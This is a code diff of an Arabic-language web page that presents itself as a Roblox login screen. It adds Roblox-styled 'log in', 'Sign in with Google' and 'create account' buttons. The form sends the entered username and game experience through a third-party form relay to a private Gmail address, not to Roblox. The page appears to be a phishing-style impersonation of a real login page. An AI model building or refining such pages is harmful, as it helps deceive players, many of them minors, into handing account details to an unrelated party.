@@ -36,6 +36,7 @@ body{
 .btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
 .btn-blue{background:#2a7cff;border:none;color:white;}
 .btn-dark{background:#111;border:1px solid #555;color:white;}
+
 .bg{
   background:url("IMG_0161.png") center/cover no-repeat;
   min-height:calc(100vh - 64px);
@@ -43,36 +44,64 @@ body{
   justify-content:center;
   align-items:center;
 }
+
+/* ===== Login Box ===== */
 .box{
   background:rgba(35,38,47,0.95);
   width:380px;
   padding:25px;
-  border-radius:14px;
+  border-radius:16px;
+  box-shadow:0 0 25px rgba(0,0,0,0.6);
 }
 .box h2{text-align:center;}
+
 .box input{
   width:100%;
   padding:12px;
   margin:10px 0;
   border:none;
-  border-radius:8px;
+  border-radius:10px;
   background:#2f3340;
   color:#ffffff;
   font-size:16px;
 }
 .box input::placeholder{color:#bbbbbb;}
-.mainbtn{
+
+.line{height:1px;background:#444;margin:15px 0;}
+
+/* Roblox Buttons */
+.rb-btn{
   width:100%;
   padding:12px;
-  background:#2a7cff;
-  border:none;
-  border-radius:8px;
-  color:white;
-  font-weight:bold;
+  border-radius:10px;
+  font-size:16px;
+  font-weight:700;
   cursor:pointer;
+  border:none;
+  transition:0.2s;
 }
-.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
-.line{height:1px;background:#444;margin:15px 0;}
+
+.rb-login{
+  background:linear-gradient(#3aa0ff,#1f6bff);
+  color:white;
+}
+.rb-login:hover{filter:brightness(1.15);}
+
+.rb-google{
+  background:#111;
+  color:white;
+  border:1px solid #555;
+}
+.rb-google:hover{background:#1a1a1a;}
+
+.rb-signup{
+  background:#2f3340;
+  color:#ddd;
+  border:1px solid #555;
+}
+.rb-signup:hover{background:#3a3f50;color:white;}
+
+.small{text-align:center;font-size:13px;color:#ccc;margin-top:12px;}
 </style>
 </head>
 
@@ -100,21 +129,21 @@ body{
     <h2>تسجيل الدخول إلى Roblox</h2>
 
     <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
-
-      <!-- Subject and Template to format the email properly -->
       <input type="hidden" name="_subject" value="تسجيل لاعب جديد">
       <input type="hidden" name="_template" value="table">
 
-      <!-- User Inputs -->
-      <input type="text" name="Player_Name" placeholder="اسمك" required>
-      <input type="text" name="Player_Experience" placeholder="خبراتك" required>
+      <input type="text" name="Player_Name" placeholder="اسم المستخدم" required>
+      <input type="text" name="Player_Experience" placeholder="خبراتك في اللعبة" required>
 
-      <!-- Submit button -->
-      <button type="submit" class="mainbtn">تسجيل الدخول</button>
-
+      <button type="submit" class="rb-btn rb-login">تسجيل الدخول</button>
     </form>
 
-    <div class="small">ليس لديك حساب؟ اشترك</div>
+    <div class="line"></div>
+
+    <button class="rb-btn rb-google">تسجيل بواسطة Google</button>
+    <button class="rb-btn rb-signup" style="margin-top:10px;">إنشاء حساب جديد</button>
+
+    <div class="small">ليس لديك حساب؟ أنشئ حساب الآن</div>
   </div>
 </div>
 
